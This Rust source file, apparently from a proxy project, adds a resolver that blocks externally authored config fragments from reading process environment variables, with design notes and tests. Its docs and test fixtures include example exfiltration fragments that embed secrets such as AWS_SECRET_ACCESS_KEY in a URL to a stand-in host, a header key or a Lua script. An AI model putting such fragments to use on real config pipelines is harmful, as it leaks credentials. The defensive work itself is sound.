// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Soap Bucket LLC

//! Confined template resolution for externally authored config fragments.
//!
//! # The problem this closes
//!
//! Two passes on the compile path read the process environment with no
//! restriction at all:
//!
//! * [`crate::compiler::interpolate_env_vars`] substitutes `${VAR}` over
//!   the raw document *text*, before any parse, inside
//!   [`crate::compile_config`]. Being text-level, it reaches every byte
//!   of the document, including the `lua_script` / `js_script` /
//!   `rego_module` bodies that the post-parse interpolator deliberately
//!   skips.
//! * `{{env.X}}` resolution inside
//!   [`crate::compiler::interpolate_config_vars`] does the same per JSON
//!   string value after the parse.
//!
//! While every byte of the document is written by the operator who runs
//! the proxy, that is defensible: the operator already has the
//! environment. Config aggregation breaks the assumption. Once a
//! fragment authored in another repository is composed into the
//! document, an unrestricted reader turns a config write permission into
//! a read of every secret in the aggregator's environment, which is
//! exactly where credentials live. A fragment shipping
//!
//! ```yaml
//! action:
//!   type: proxy
//!   url: "https://collect.example/${AWS_SECRET_ACCESS_KEY}"
//! ```
//!
//! exfiltrates on the next compose.
//!
//! # The shape, and why this one
//!
//! [`resolve_confined_fragment`] resolves a fragment against a binding
//! set the *caller* supplies and nothing else. It reads no environment
//! variable, on any code path, in any field. A fragment names an
//! **input**; the operator decides what that input is bound to.
//!
//! That is the model Helm settled on and it is the state of the art for
//! third-party-authored template fragments. Helm ships the whole Sprig
//! function library to chart authors except `env` and `expandenv`,
//! removed because they "would have given chart authors access to
//! Tiller's environment"; a chart resolves against caller-supplied
//! `.Values` instead (<https://helm.sh/docs/howto/charts_tips_and_tricks/>,
//! <https://github.com/helm/helm/pull/5815>). Argo CD excludes the same
//! two functions plus `getHostByName` from its Sprig exposure. It is the
//! same boundary Kubernetes draws one layer down: a container's
//! environment is what the Pod spec enumerates through `env` and
//! `envFrom`, and a container never sees the kubelet's environment.
//!
//! The alternatives were considered and are weaker:
//!
//! * **A name allowlist or prefix** (decK requires a `DECK_` prefix on
//!   any variable a state file may reach through `${{ env "..." }}`,
//!   <https://developer.konghq.com/deck/reference/env-variables/>). The
//!   fragment still names a process variable, so every variable that
//!   happens to carry the prefix is readable, and the allowlist is a
//!   property of the runner rather than of the caller. A binding set is
//!   strictly stronger: the fragment cannot name a variable at all, and
//!   the operator is free to bind the input from the environment, from a
//!   secret backend, or from a literal, without the fragment knowing or
//!   caring.
//! * **A prefix with no allowlist** (Caddy's `{env.NAME}`). Explicit
//!   about which placeholder is an environment read, silent about which
//!   variables are in scope: all of them are.
//! * **Document-wide text substitution** (APISIX's `${{VAR:=default}}`
//!   over `config.yaml`). This is what sbproxy does today for
//!   operator-authored config, and it is precisely the primitive that
//!   cannot express "this subtree is env-frozen".
//! * **Scanning fragment text for `${` before splicing.** A deny list
//!   over text: it forbids legitimate forms (`${args.id}` is MCP
//!   local-tool vocabulary, `$${VAR}` is the documented escape) while
//!   missing anything a later resolution step can synthesize. The
//!   project rule is that a boundary is an allowlist, never a deny list.
//!
//! Envoy is the outlier worth naming: it has no document-wide
//! environment substitution at all, and the environment enters only at
//! named extension points such as the `%ENVIRONMENT(X)%` access-log
//! command operator. That is the same instinct, expressed by having no
//! general mechanism to confine.
//!
//! # The contract
//!
//! Given a fragment and a binding set, [`resolve_confined_fragment`]
//! returns YAML in which **nothing a later pass could resolve
//! survives**. Concretely:
//!
//! | Form | Confined treatment | Why |
//! |---|---|---|
//! | `{{vars.X}}`, `{{variables.X}}` | resolved from the bindings; an unbound `X` is [`ConfinedTemplateError::UnboundInput`] | the one thing a fragment may parameterize |
//! | `${VAR}`, `${VAR:-default}` | refused, naming `VAR` and the field | `interpolate_env_vars` would read it, in any field |
//! | `{{env.X}}` outside a script body | refused, naming `X` and the field | `interpolate_config_vars` would read it |
//! | `{{env.X}}` inside a script body | literal | no pass resolves `{{ }}` in a script body |
//! | `${args.x}`, `${steps.x.y}`, `${method}` | literal | runtime vocabulary; `interpolate_env_vars` does not touch it either |
//! | `$${VAR}` | literal | the documented escape; no pass resolves it |
//! | `{{request.x}}`, any other `{{prefix}}` | literal | resolved nowhere, at compile or at runtime |
//! | any script body (`lua_script`, `js_script`, `rego_module`) | no `{{ }}` substitution at all | WOR-2482: a literal `{{` in a script must reach the engine as authored |
//!
//! The refusal set is defined as *exactly* the placeholders some
//! fleet-wide pass would resolve from the environment, and it is
//! computed with the same scanner that pass uses (`env_references_in`
//! and `placeholder_is_env_reference`, both in
//! [`crate::compiler`]). Sharing the
//! scanner is deliberate: a detector narrower than its enforcer is worse
//! than none, and the `$$` pair-parity rule and the MCP `args.` /
//! `steps.` carve-out are exactly the places two hand-written copies
//! would drift.
//!
//! # Why refuse rather than pass through
//!
//! WOR-2433 leaves the choice open between refusing a `${VAR}` that
//! survives a fragment and escaping it so the publish-time
//! unresolved-reference check does not see it. This module refuses, for
//! two reasons.
//!
//! Passing one through is not safe. The confined pass runs on the
//! fragment; the *composed* document then goes to
//! [`crate::compile_config`], whose text-level `${VAR}` substitution
//! reaches every byte, script bodies included. A `${VAR}` that survives
//! confinement is read from the aggregator's environment a moment later,
//! which is the whole defect.
//!
//! Escaping is not honest. `$${VAR}` survives both passes, but the `$$`
//! bytes stay in the value: only the MCP local-tool engine owns an
//! unescape, so a Lua body would reach its engine as `$${VAR}` rather
//! than as authored. Rewriting a script body is worse than refusing to
//! ship it.
//!
//! Refusing keeps the publish-time check honest in both directions.
//! [`crate::unresolved_env_references`] still fires for
//! operator-authored content, because that path is untouched; and it
//! cannot misfire on a confined fragment, because a confined fragment
//! carries no live `${VAR}` for it to find.
//!
//! # What this module does not do
//!
//! It does not change the fleet-wide passes. Operator-authored config
//! keeps today's behavior exactly, `${VAR:-default}` shell semantics
//! included. Confinement is opt-in at the call site, and the call site
//! is whatever composes an externally authored fragment.

use std::collections::HashMap;

use crate::compiler::{env_references_in, lookup_variable_path};

/// Keys whose value is an executed or evaluated script body rather than
/// config text.
///
/// The same list [`crate::compiler::interpolate_config_vars`] skips, and
/// for the same reason (WOR-2482): a literal `{{` inside a Lua string, a
/// JS comment, or a Rego module must reach its engine as authored, so no
/// `{{ }}` substitution runs inside one. `${VAR}` is a different matter
/// and is refused here even inside a script body, because the text-level
/// pre-parse pass on the composed document does reach it.
const SCRIPT_BODY_KEYS: &[&str] = &["lua_script", "js_script", "rego_module"];

/// The `{{ }}` prefixes some later pass resolves, and which therefore
/// must not survive a confined fragment.
///
/// `request.` is absent on purpose: it is bound per request by the
/// modifier context, never from the environment, and the fleet-wide pass
/// leaves it literal too.
const RESOLVABLE_BRACE_PREFIXES: &[&str] = &["env.", "vars.", "variables."];

/// A confined fragment was refused. Every variant names the fragment and
/// the field path, and none of them carries a value read from the
/// process environment, because the confined pass reads none.
#[derive(Debug, thiserror::Error)]
pub enum ConfinedTemplateError {
    /// The fragment is not YAML.
    #[error("config fragment `{fragment}` does not parse as YAML: {source}")]
    Parse {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// The parse failure.
        #[source]
        source: serde_yaml::Error,
    },
    /// The fragment carries a custom YAML tag.
    ///
    /// Tags are silently stripped by the parser, keeping the bare
    /// scalar, so `password: !env ADMIN_PASSWORD` becomes the literal
    /// string `ADMIN_PASSWORD`. Refused at the fragment boundary so the
    /// error names the fragment rather than a path in a composed
    /// document nobody wrote by hand.
    #[error(
        "config fragment `{fragment}` carries the unsupported YAML tag `{tag}` at `{path}`. \
         Tags are stripped by the parser, so the value would be the literal text after the \
         tag. A fragment parameterizes itself with `{{{{vars.NAME}}}}` inputs its caller \
         binds; see the `Confined fragments` section of docs/configuration.md."
    )]
    YamlTag {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// Dotted path to the tagged node.
        path: String,
        /// The tag as authored, e.g. `!env`.
        tag: String,
    },
    /// The fragment references a process environment variable with
    /// `${VAR}`.
    #[error(
        "config fragment `{fragment}` references the process environment variable \
         `{variable}` at `{path}`. A fragment resolves only the inputs its caller binds, so \
         this is refused rather than read: an externally authored fragment that could name \
         a variable could read every credential in the aggregator's environment. Declare it \
         as a `{{{{vars.NAME}}}}` input and let the operator bind it, or write \
         `{variable_escaped}` to keep the literal text. See the `Confined fragments` \
         section of docs/configuration.md."
    )]
    EnvReference {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// Dotted path to the offending field, suffixed with
        /// `(mapping key)` when the placeholder sits in a mapping key
        /// rather than in a value.
        path: String,
        /// The variable name, with any `:-default` tail removed. The
        /// variable's *value* is deliberately absent: nothing here ever
        /// reads it.
        variable: String,
        /// The placeholder rendered with the `$$` escape, ready to paste.
        variable_escaped: String,
    },
    /// The fragment references a process environment variable with
    /// `{{env.X}}`.
    #[error(
        "config fragment `{fragment}` references the process environment variable \
         `{variable}` at `{path}` as `{{{{env.{variable}}}}}`. A fragment resolves only the \
         inputs its caller binds. Declare it as a `{{{{vars.NAME}}}}` input and let the \
         operator bind it. See the `Confined fragments` section of docs/configuration.md."
    )]
    EnvTemplate {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// Dotted path to the offending field.
        path: String,
        /// The variable name. Its value is deliberately absent.
        variable: String,
    },
    /// The fragment references an input its caller did not bind.
    ///
    /// A named error rather than a warning or a literal passthrough: a
    /// fragment reading a variable it never declared as an input is the
    /// same defect as reading the environment, at a smaller radius.
    #[error(
        "config fragment `{fragment}` references the input `{variable}` at `{path}`, which \
         its caller did not bind. Bound inputs: {bound}. A fragment may read only the inputs \
         it was given; see the `Confined fragments` section of docs/configuration.md."
    )]
    UnboundInput {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// Dotted path to the offending field.
        path: String,
        /// The input name the fragment asked for.
        variable: String,
        /// The bound input **names**, sorted, comma separated, or
        /// `(none)`. Names only: a binding value can be a credential.
        bound: String,
    },
}

/// Resolve an externally authored config fragment against a binding set,
/// and nothing else.
///
/// `fragment` is a label for error messages: whatever identifies the
/// fragment to the operator (a repository and path, an `origin_sources`
/// entry). `yaml` is the fragment as fetched. `bindings` is the input
/// set the caller declared for it; a dotted reference
/// (`{{vars.limits.rps}}`) indexes the map with its first segment and
/// walks nested JSON objects with the rest, the same way origin
/// `variables:` resolve.
///
/// Returns the resolved fragment as YAML, ready to compose. The result
/// carries no live `${VAR}`, no resolvable `{{env.X}}`, and no
/// resolvable `{{vars.X}}`, so composing it into a document and handing
/// that document to [`crate::compile_config`] cannot resolve any of the
/// fragment's text against the process environment.
///
/// The returned YAML is re-serialized from the parsed value tree, so
/// comments and formatting from the fragment do not survive. That is
/// deliberate as well as incidental: a comment is text nobody parses,
/// and the text-level `${VAR}` pass on the composed document would
/// happily substitute inside one.
///
/// # Errors
///
/// Returns a [`ConfinedTemplateError`] naming the fragment, the field
/// path, and the variable, for a fragment that does not parse, carries a
/// YAML tag, references the process environment in any form, or
/// references an input outside `bindings`.
pub fn resolve_confined_fragment(
    fragment: &str,
    yaml: &str,
    bindings: &HashMap<String, serde_json::Value>,
) -> Result<String, ConfinedTemplateError> {
    let mut root: serde_yaml::Value =
        serde_yaml::from_str(yaml).map_err(|source| ConfinedTemplateError::Parse {
            fragment: fragment.to_string(),
            source,
        })?;
    let resolver = Resolver {
        fragment,
        bindings,
        bound_names: bound_names(bindings),
    };
    resolver.walk(&mut root, "", false)?;
    // Serializing a parsed value tree cannot fail on any value that came
    // out of the parser, but the signature is fallible; report it the
    // same way a parse failure is reported rather than unwrapping.
    serde_yaml::to_string(&root).map_err(|source| ConfinedTemplateError::Parse {
        fragment: fragment.to_string(),
        source,
    })
}

/// The bound input names, sorted, for an error message. Names only.
fn bound_names(bindings: &HashMap<String, serde_json::Value>) -> String {
    if bindings.is_empty() {
        return "(none)".to_string();
    }
    let mut names: Vec<&str> = bindings.keys().map(String::as_str).collect();
    names.sort_unstable();
    names.join(", ")
}

/// Carries the per-call context so the recursive walk does not thread
/// four arguments through every frame.
struct Resolver<'a> {
    fragment: &'a str,
    bindings: &'a HashMap<String, serde_json::Value>,
    bound_names: String,
}

impl Resolver<'_> {
    /// Resolve every string in `value` in place.
    ///
    /// `in_script_body` is set once the walk has descended into a
    /// [`SCRIPT_BODY_KEYS`] key and stays set for that whole subtree,
    /// matching how `interpolate_config_vars` skips one.
    fn walk(
        &self,
        value: &mut serde_yaml::Value,
        path: &str,
        in_script_body: bool,
    ) -> Result<(), ConfinedTemplateError> {
        match value {
            serde_yaml::Value::Tagged(tagged) => {
                return Err(ConfinedTemplateError::YamlTag {
                    fragment: self.fragment.to_string(),
                    path: shown_path(path),
                    tag: tagged.tag.to_string(),
                });
            }
            serde_yaml::Value::String(s) => {
                *s = self.resolve_string(path, s, in_script_body)?;
            }
            serde_yaml::Value::Sequence(seq) => {
                for (index, item) in seq.iter_mut().enumerate() {
                    let child = join_path(path, &index.to_string());
                    self.walk(item, &child, in_script_body)?;
                }
            }
            serde_yaml::Value::Mapping(map) => {
                for (key, val) in map.iter_mut() {
                    let key_name = key.as_str().map_or_else(|| "?".to_string(), str::to_owned);
                    let child = join_path(path, &key_name);
                    // A mapping KEY is text too, and the pre-parse pass
                    // on the composed document substitutes inside one:
                    // `"${AWS_SECRET_ACCESS_KEY}": v` would exfiltrate
                    // through a header name. No later pass resolves
                    // `{{ }}` in a key, so keys are scanned for `${VAR}`
                    // and never substituted. Scanning values alone here
                    // would be a detector narrower than its enforcer.
                    if let Some(key_text) = key.as_str() {
                        self.refuse_env_references(
                            &format!("{} (mapping key)", shown_path(&child)),
                            key_text,
                        )?;
                    }
                    let script = in_script_body || SCRIPT_BODY_KEYS.contains(&key_name.as_str());
                    self.walk(val, &child, script)?;
                }
            }
            _ => {}
        }
        Ok(())
    }

    /// Resolve one string: substitute the bound `{{vars.X}}` inputs,
    /// then refuse anything a later pass could still resolve.
    fn resolve_string(
        &self,
        path: &str,
        input: &str,
        in_script_body: bool,
    ) -> Result<String, ConfinedTemplateError> {
        let shown = shown_path(path);
        let resolved = if in_script_body {
            // No `{{ }}` substitution inside a script body, matching
            // `interpolate_config_vars`. Nothing resolves `{{ }}` there
            // later either, so a `{{env.X}}` in a Lua string is inert
            // text and stays as authored.
            input.to_string()
        } else {
            self.substitute_inputs(&shown, input)?
        };
        // Post-substitution, not pre: a binding whose value contains
        // `$` or `{` can synthesize a live placeholder that was not in
        // the fragment as authored. `"${{{vars.name}}}"` with `name`
        // bound to `AWS_SECRET_ACCESS_KEY` produces a live `${...}`
        // that a pre-substitution scan would never see.
        self.refuse_env_references(&shown, &resolved)?;
        if !in_script_body {
            self.refuse_resolvable_braces(&shown, &resolved)?;
        }
        Ok(resolved)
    }

    /// Replace `{{vars.X}}` / `{{variables.X}}` with the bound input.
    ///
    /// `{{env.X}}` is refused here rather than left for the residue scan
    /// so the error can say which form was written. Every other prefix
    /// is left literal, exactly as the fleet-wide pass leaves it.
    fn substitute_inputs(
        &self,
        shown_path: &str,
        input: &str,
    ) -> Result<String, ConfinedTemplateError> {
        let mut result = String::with_capacity(input.len());
        let mut rest = input;
        while let Some(start) = rest.find("{{") {
            result.push_str(&rest[..start]);
            let after_open = &rest[start + 2..];
            let Some(end) = after_open.find("}}") else {
                result.push_str(&rest[start..]);
                return Ok(result);
            };
            let key = after_open[..end].trim();
            if let Some(name) = key
                .strip_prefix("vars.")
                .or_else(|| key.strip_prefix("variables."))
            {
                match lookup_variable_path(self.bindings, name) {
                    Some(serde_json::Value::String(s)) => result.push_str(s),
                    Some(other) => result.push_str(&other.to_string()),
                    None => {
                        return Err(ConfinedTemplateError::UnboundInput {
                            fragment: self.fragment.to_string(),
                            path: shown_path.to_string(),
                            variable: name.to_string(),
                            bound: self.bound_names.clone(),
                        })
                    }
                }
            } else if let Some(name) = key.strip_prefix("env.") {
                return Err(ConfinedTemplateError::EnvTemplate {
                    fragment: self.fragment.to_string(),
                    path: shown_path.to_string(),
                    variable: name.to_string(),
                });
            } else {
                result.push_str("{{");
                result.push_str(&after_open[..end]);
                result.push_str("}}");
            }
            rest = &after_open[end + 2..];
        }
        result.push_str(rest);
        Ok(result)
    }

    /// Refuse every live `${VAR}` in `text`.
    ///
    /// "Live" is decided by [`env_references_in`], the same scanner the
    /// fleet-wide hazard report runs, so this refuses exactly the
    /// placeholders `interpolate_env_vars` would resolve from the
    /// environment: no more (`${args.id}`, `$${VAR}`, `${method}` stay
    /// literal) and no less.
    fn refuse_env_references(
        &self,
        shown_path: &str,
        text: &str,
    ) -> Result<(), ConfinedTemplateError> {
        if let Some(reference) = env_references_in(text).first() {
            // `${NAME}` / `${NAME:-default}` -> `NAME`. The default is
            // dropped from the message: the variable is what the author
            // has to stop naming.
            let inner = &reference[2..reference.len() - 1];
            let name = inner.split_once(":-").map_or(inner, |(name, _)| name);
            return Err(ConfinedTemplateError::EnvReference {
                fragment: self.fragment.to_string(),
                path: shown_path.to_string(),
                variable: name.to_string(),
                variable_escaped: format!("${reference}"),
            });
        }
        Ok(())
    }

    /// Refuse every `{{ }}` placeholder a later pass would resolve.
    ///
    /// After [`Self::substitute_inputs`] has run, the only way one of
    /// these survives is that a binding's value synthesized it, so this
    /// is the fail-closed half of the injection check above.
    fn refuse_resolvable_braces(
        &self,
        shown_path: &str,
        text: &str,
    ) -> Result<(), ConfinedTemplateError> {
        let mut rest = text;
        while let Some(start) = rest.find("{{") {
            let after_open = &rest[start + 2..];
            let Some(end) = after_open.find("}}") else {
                return Ok(());
            };
            let key = after_open[..end].trim();
            if let Some(prefix) = RESOLVABLE_BRACE_PREFIXES
                .iter()
                .find(|prefix| key.starts_with(**prefix))
            {
                let name = &key[prefix.len()..];
                return Err(if *prefix == "env." {
                    ConfinedTemplateError::EnvTemplate {
                        fragment: self.fragment.to_string(),
                        path: shown_path.to_string(),
                        variable: name.to_string(),
                    }
                } else {
                    ConfinedTemplateError::UnboundInput {
                        fragment: self.fragment.to_string(),
                        path: shown_path.to_string(),
                        variable: name.to_string(),
                        bound: self.bound_names.clone(),
                    }
                });
            }
            rest = &after_open[end + 2..];
        }
        Ok(())
    }
}

/// `parent` and `child` joined with a dot, matching the dotted paths
/// `scan_yaml_hazards` reports.
fn join_path(parent: &str, child: &str) -> String {
    if parent.is_empty() {
        child.to_string()
    } else {
        format!("{parent}.{child}")
    }
}

/// The document root has no dotted path; name it so an error is not
/// missing its location.
fn shown_path(path: &str) -> String {
    if path.is_empty() {
        "<root>".to_string()
    } else {
        path.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::compiler::{interpolate_env_vars, unresolved_env_references};
    use crate::test_env::EnvVarGuard;

    /// The variable every leak test sets in the test process. If the
    /// confined pass ever reads the environment, this value shows up in
    /// an output or an error and the assertion naming it fails.
    const SECRET_VAR: &str = "SBPROXY_CONFINED_TEST_SECRET";
    /// The value that must never appear anywhere the confined pass
    /// produces.
    const SECRET_VALUE: &str = "sentinel-value-must-not-leak";

    fn secret_env() -> EnvVarGuard {
        EnvVarGuard::set(&[("SBPROXY_CONFINED_TEST_SECRET", Some(SECRET_VALUE))])
    }

    fn bindings(pairs: &[(&str, serde_json::Value)]) -> HashMap<String, serde_json::Value> {
        pairs
            .iter()
            .map(|(k, v)| ((*k).to_string(), v.clone()))
            .collect()
    }

    #[test]
    fn fragment_env_reference_is_refused_without_reading_the_variable() {
        let _env = secret_env();
        let fragment = format!(
            "action:\n  type: proxy\n  url: \"https://collect.example/${{{SECRET_VAR}}}\"\n"
        );
        let error = resolve_confined_fragment("acme/api@sb.yml", &fragment, &bindings(&[]))
            .expect_err("a fragment naming a process variable must be refused");
        match &error {
            ConfinedTemplateError::EnvReference {
                fragment,
                path,
                variable,
                ..
            } => {
                assert_eq!(variable, SECRET_VAR);
                assert_eq!(path, "action.url");
                assert_eq!(fragment, "acme/api@sb.yml");
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        let rendered = error.to_string();
        assert!(rendered.contains(SECRET_VAR), "{rendered}");
        assert!(
            !rendered.contains(SECRET_VALUE),
            "the refusal echoed the variable's value: {rendered}"
        );
    }

    #[test]
    fn fragment_env_reference_with_a_shell_default_is_refused_by_variable_name() {
        let _env = secret_env();
        let fragment = format!("action:\n  url: \"x/${{{SECRET_VAR}:-fallback}}\"\n");
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("a `:-default` form is still an environment read");
        match &error {
            ConfinedTemplateError::EnvReference { variable, .. } => {
                // The variable, not the default: the name is what the
                // fragment author has to stop writing.
                assert_eq!(variable, SECRET_VAR);
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn lua_script_env_reference_is_refused_without_reading_the_variable() {
        let _env = secret_env();
        // The pre-parse text pass reaches a script body, which is the
        // whole reason the post-parse interpolator's skip list is not
        // enough on its own.
        let fragment = format!(
            "transforms:\n  - type: lua\n    lua_script: |\n      local leak = \"${{{SECRET_VAR}}}\"\n      return leak\n"
        );
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("a script body naming a process variable must be refused");
        match &error {
            ConfinedTemplateError::EnvReference { variable, path, .. } => {
                assert_eq!(variable, SECRET_VAR);
                assert_eq!(path, "transforms.0.lua_script");
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        assert!(
            !error.to_string().contains(SECRET_VALUE),
            "the refusal echoed the variable's value"
        );
    }

    #[test]
    fn script_bodies_pass_every_other_placeholder_through_verbatim() {
        let _env = secret_env();
        // A script body is opaque: no `{{ }}` substitution even for a
        // bound input, and the documented `$$` escape plus the MCP
        // runtime vocabulary survive byte for byte.
        let body = "local a = \"$${HOME}\"\nlocal b = \"${args.user_id}\"\nlocal c = \"{{vars.rps}}\"\nlocal d = \"{{env.HOME}}\"\nlocal e = {{ 1, 2 }}";
        let fragment = serde_yaml::to_string(&serde_json::json!({
            "transforms": [{ "type": "lua", "lua_script": body }]
        }))
        .expect("fixture serializes");
        let out = resolve_confined_fragment(
            "acme/api",
            &fragment,
            &bindings(&[("rps", serde_json::json!(50))]),
        )
        .expect("a script body with no environment reference resolves");
        let parsed: serde_yaml::Value = serde_yaml::from_str(&out).expect("output parses");
        let round_tripped = parsed["transforms"][0]["lua_script"]
            .as_str()
            .expect("the script body survives as a string");
        assert_eq!(round_tripped, body);
        assert!(!out.contains(SECRET_VALUE));
    }

    #[test]
    fn env_template_form_is_refused_without_reading_the_variable() {
        let _env = secret_env();
        let fragment = format!(
            "request_modifiers:\n  - headers:\n      set:\n        X-Leak: \"{{{{env.{SECRET_VAR}}}}}\"\n"
        );
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("`{{env.X}}` is an environment read too");
        match &error {
            ConfinedTemplateError::EnvTemplate { variable, path, .. } => {
                assert_eq!(variable, SECRET_VAR);
                assert_eq!(path, "request_modifiers.0.headers.set.X-Leak");
            }
            other => panic!("expected an EnvTemplate refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn a_mapping_key_naming_a_variable_is_refused() {
        let _env = secret_env();
        // The pre-parse pass substitutes inside a KEY as readily as
        // inside a value, so scanning values alone would be a detector
        // narrower than its enforcer.
        let fragment = format!("headers:\n  \"${{{SECRET_VAR}}}\": \"anything\"\n");
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("a mapping key naming a process variable must be refused");
        match &error {
            ConfinedTemplateError::EnvReference { variable, path, .. } => {
                assert_eq!(variable, SECRET_VAR);
                assert!(path.ends_with("(mapping key)"), "{path}");
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn a_bound_input_resolves_including_a_dotted_path() {
        let fragment = "policies:\n  - type: rate_limiting\n    requests_per_second: \"{{vars.limits.rps}}\"\n    burst: \"{{variables.burst}}\"\n";
        let out = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[
                ("limits", serde_json::json!({ "rps": 25 })),
                ("burst", serde_json::json!("50")),
            ]),
        )
        .expect("bound inputs resolve");
        let parsed: serde_yaml::Value = serde_yaml::from_str(&out).expect("output parses");
        assert_eq!(parsed["policies"][0]["requests_per_second"], "25");
        assert_eq!(parsed["policies"][0]["burst"], "50");
    }

    #[test]
    fn an_unbound_input_is_a_named_error_listing_only_input_names() {
        let fragment = "action:\n  url: \"https://{{vars.upstream}}/v1\"\n";
        let error = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[("token", serde_json::json!("s3cr3t-binding-value"))]),
        )
        .expect_err("an input outside the binding set is an error, not a passthrough");
        match &error {
            ConfinedTemplateError::UnboundInput {
                variable,
                path,
                bound,
                ..
            } => {
                assert_eq!(variable, "upstream");
                assert_eq!(path, "action.url");
                assert_eq!(bound, "token");
            }
            other => panic!("expected an UnboundInput refusal, got {other:?}"),
        }
        assert!(
            !error.to_string().contains("s3cr3t-binding-value"),
            "the refusal listed a binding's value, not just its name"
        );
    }

    #[test]
    fn a_binding_value_cannot_synthesize_an_environment_reference() {
        let _env = secret_env();
        // Scanning the fragment before substitution would miss this:
        // the live `${...}` exists only in the substituted result.
        let fragment = "action:\n  url: \"https://collect.example/{{vars.suffix}}\"\n";
        let error = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[("suffix", serde_json::json!(format!("${{{SECRET_VAR}}}")))]),
        )
        .expect_err("a synthesized environment reference must be refused");
        match &error {
            ConfinedTemplateError::EnvReference { variable, .. } => {
                assert_eq!(variable, SECRET_VAR);
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn a_binding_value_cannot_synthesize_a_resolvable_template() {
        let _env = secret_env();
        let fragment = "action:\n  url: \"https://collect.example/{{vars.suffix}}\"\n";
        let error = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[(
                "suffix",
                serde_json::json!(format!("{{{{env.{SECRET_VAR}}}}}")),
            )]),
        )
        .expect_err("a synthesized `{{env.X}}` must be refused");
        match &error {
            ConfinedTemplateError::EnvTemplate { variable, .. } => {
                assert_eq!(variable, SECRET_VAR);
            }
            other => panic!("expected an EnvTemplate refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn a_yaml_tag_in_a_fragment_is_refused_naming_the_fragment() {
        let error = resolve_confined_fragment(
            "acme/api",
            "password: !env ADMIN_PASSWORD\n",
            &bindings(&[]),
        )
        .expect_err("a tag is stripped by the parser and must not reach a value");
        match &error {
            ConfinedTemplateError::YamlTag {
                fragment,
                tag,
                path,
                ..
            } => {
                assert_eq!(fragment, "acme/api");
                assert_eq!(tag, "!env");
                assert_eq!(path, "password");
            }
            other => panic!("expected a YamlTag refusal, got {other:?}"),
        }
    }

    #[test]
    fn the_confined_refusal_set_is_exactly_what_the_env_pass_would_read() {
        // The detector-vs-enforcer check. For each form, ask the shipped
        // fleet-wide pass whether it reads the environment (its output
        // changes when the variable is set), then require the confined
        // pass to refuse exactly those. A carve-out that drifted wider
        // or narrower than `interpolate_env_vars` fails here.
        let _env = secret_env();
        let forms = [
            format!("${{{SECRET_VAR}}}"),
            format!("${{{SECRET_VAR}:-fallback}}"),
            format!("$${{{SECRET_VAR}}}"),
            format!("${{args.{SECRET_VAR}}}"),
            format!("${{steps.fetch.{SECRET_VAR}}}"),
            "${method}".to_string(),
            "plain text with no placeholder".to_string(),
        ];
        for form in &forms {
            let enforcer_reads_env = interpolate_env_vars(form) != *form;
            let fragment = serde_yaml::to_string(&serde_json::json!({ "field": form }))
                .expect("fixture serializes");
            let confined_refuses =
                resolve_confined_fragment("acme/api", &fragment, &bindings(&[])).is_err();
            assert_eq!(
                confined_refuses, enforcer_reads_env,
                "confined refusal and env-pass behavior disagree on {form:?}"
            );
        }
    }

    #[test]
    fn operator_authored_config_still_reads_the_environment() {
        // The confined pass is a second door, not a change to the first
        // one. Same text, the fleet-wide pass, still resolves.
        let _env = secret_env();
        let text = format!("url: https://x/${{{SECRET_VAR}}}\n");
        assert_eq!(
            interpolate_env_vars(&text),
            format!("url: https://x/{SECRET_VALUE}\n")
        );
    }

    #[test]
    fn a_confined_fragment_leaves_the_publish_check_nothing_to_report() {
        // `unresolved_env_references` refuses an authority document that
        // still carries a live `${VAR}`. A confined fragment must never
        // trip it, because the confined pass refuses rather than leaving
        // one behind.
        let _env = secret_env();
        let fragment = "action:\n  type: mcp\n  arg: \"${args.user_id}\"\n  escaped: \"$${HOME}\"\n  header: \"{{request.headers.x}}\"\n  rps: \"{{vars.rps}}\"\n";
        let out = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[("rps", serde_json::json!(10))]),
        )
        .expect("nothing here is an environment reference");
        assert!(
            unresolved_env_references(&out).is_empty(),
            "the publish-time check misfired on a confined fragment: {:?}",
            unresolved_env_references(&out)
        );
        assert!(out.contains("${args.user_id}"), "{out}");
        assert!(out.contains("$${HOME}"), "{out}");
        assert!(out.contains("{{request.headers.x}}"), "{out}");
        assert!(out.contains("10"), "{out}");
    }
}
